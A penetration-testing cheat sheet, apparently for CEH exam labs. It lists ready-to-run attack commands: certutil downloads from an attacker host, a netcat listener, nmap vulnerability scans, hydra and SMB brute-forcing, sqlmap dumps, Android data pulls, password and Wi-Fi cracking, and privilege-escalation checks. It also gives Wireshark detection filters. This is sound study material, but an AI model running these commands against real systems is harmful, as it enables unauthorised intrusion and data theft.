# CEH Cheet Sheet


---

> **Common for both:** `python3 -m http.server 8080`

*   
    `Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg`
*  
    `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg`
*   
    `nc -lnvp 1234` 

---

*   **Visual Tree:** `tree` or  tree | grep .bmp
*   **Find all .txt:** `sudo find / -name *.txt` 
*   **Search current path:** `sudo find . -name SpecificFileName.txt`
*   
    `sort filename.txt | uniq > newfile.txt` (Removes duplicates from a wordlist)

*   **Identify Servers:** `nmap -A -oN scans`
*   **Domain Controller (DC) Check:** Look for **88/TCP (kerberos-sec)** and **389/TCP (LDAP)**. 
*   **Vulnerability Research:** `nmap -Pn --script vuln <TIP> -T5`
*   **Directory Bruting:** `dirb <targetDomain> -x eg.txt`
*   gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

---

*   **Connect:** `adb connect <TIP>:5555`
*   **Data Extraction:** `adb pull sdcard/`
*   **PhoneSploit:** `python3 phonesploitpro.py` (Interactive: **N**=Next, **P**=Previous)
*   **IoT Analysis:** `mqtt` 

---

  **sqlmap:**
--dbs
--tables
--dump
--cookie
-r request.txt

---
*   **Scan URL:** `wpscan -url <domain or ip>`
*   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt -e u`

---

*   **file:** `file <filename>` (Identify file type/architecture)
*   **strings:** `strings <filename>` (Extract readable text/hardcoded passwords)
*   **binwalk:** `binwalk -e <filename>` (Search and extract hidden files/firmware)
*   **exiftool:** `exiftool <image_file>` (Read metadata like GPS, Author, Software)
*   **objdump:** `objdump -d <file>` (Disassemble executable sections)
*   **readpe:** `readpe --all <file.exe>` (Analyze PE headers)
*   **nm:** `nm -u <file>` (Undefined symbols/external calls)
*   **Entropy (Packed detection):** 
    *   **DIE (Detect It Easy)** for Windows.
    *   **ent <file>** for Linux (Calculates randomness/entropy).

*   **Hash Multiple Files:** `HashMyFiles.exe` (Windows) or `sha256sum <file>` (Linux).
*   **Base64:** `echo "aGVsbG8=" | base64 --decode`
*   **Steganography:** `OpenStego`, `steghide` (Use `steghide extract -sf image.jpg`).
*   certutil -hashfile filename.txt MD5

* **Check Info:** `steghide info file.jpg` (Try blank password first)
* **Standard Extract:** `steghide extract -sf file.jpg`
* **High-Speed Brute Force:** `stegseek file.jpg /usr/share/wordlists/rockyou.txt`
* *Output:* Saved as `file.jpg.out` by default.
* **White-Space Stego:** `snow -C -p "pass" output.txt` (Extracts from text files)

---

*   **Filter SYN (No ACK):** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
*   ip.dst == <ipaddress>
*   **Filter Content:** `frame contains "string"`
*   **Expert Info:** `Analyze` -> `Expert Info`
*   **DDoS Detection:** `Statistics` -> `Conversations` (Check for high volume no-reply).
*  plaintext Passwords,"http.request.method == ""POST"" or tcp contains ""password"""
*  FTP Logins,"`ftp.request.command == ""USER"""
* Telnet Traffic,telnet 
* DNS Tunneling,dns && udp.port == 53
* Suspicious User-Agents,"http.user_agent contains ""sqlmap"" or http.user_agent contains ""nmap"""

---

*   **HTTP POST Form:**  
    `hydra -l admin -P pass.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=invalid"`
*   **Check Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
*   **Brute Force:** `hydra -L users.txt -P pass.txt <TIP> smb -f`
*   **RDP Login:** `xfreerdp /v:<TIP> /u:username` or **Remmina**.
*   john hash.txt
john --show hash.txt

hashcat -m <mode> hash.txt wordlist.txt

*   **Linux (Sudo):** `sudo -l` (List allowed commands). Check [GTFOBins](https://gtfobins.github.io/).
*   **Linux (SUID):** `find / -perm -u=s -type f 2>/dev/null` (Find files with root permissions).
*   **Windows (System Info):** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
*   **Windows (Privs):** `whoami /priv` (Look for `SeImpersonatePrivilege`).
*   **Kernel Exploits:** Use `linux-exploit-suggester.sh` or `windows-exploit-suggester.py`.

---

* **Docker Detection:** `ls /.dockerenv` If this file exists, you are inside a container.
* **Docker Info:** `docker ps` this will List running containers | `docker images`this will List images.
* **Kubernetes Check:** `kubectl get pods` | `kubectl describe pod <pod_name>`.
* **S3 Bucket Recon:** `aws s3 ls s3://<bucket_name> --no-sign-request` (Check for public access).

---

* python3 /usr/share/john/ssh2john.py id_rsa
* /usr/bin/smbclient -L //10.10.10.10
* PATH=/usr/bin:$PATH enum4linux-ng -A 10.10.10.10
* hydra -l user -P pass.txt ftp://10.10.10.10
* hydra -l user -P pass.txt 10.10.10.10 ftp
* PATH=/usr/bin:$PATH enum4linux-ng -A <IP>
* /usr/bin/smbclient -L //<IP>
*which toolname
find / -name toolname 2>/dev/null

---

*   **.cap Files:** `aircrack-ng -w wordlist.txt capture.cap`
*   **BSSID Filter:** `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
*   **Double-Encryption:** Decrypt with password first, then use hash crackers/online tools.
*   searchsploit <service/version>
searchsploit -m <exploit>



- `echo "aGVsbG8=" | base64 --d`
- `base64 -d Sniff.txt > secret.txt`
`cat secret.txt`


---
